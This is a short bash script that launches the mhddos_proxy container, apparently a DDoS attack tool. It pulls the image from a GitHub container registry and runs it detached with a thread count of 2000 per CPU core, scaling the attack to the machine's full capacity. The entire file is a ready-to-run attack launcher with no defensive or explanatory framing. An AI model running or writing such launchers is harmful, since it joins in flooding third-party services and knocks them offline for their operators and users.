#!/bin/bash
THREADS=$(nproc) ; THREADS=$(expr $THREADS \* 2000)
docker stop mhddos_proxy
docker pull ghcr.io/porthole-ascend-cinnamon/mhddos_proxy
docker run -d --name mhddos_proxy --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --lang en -t $THREADS
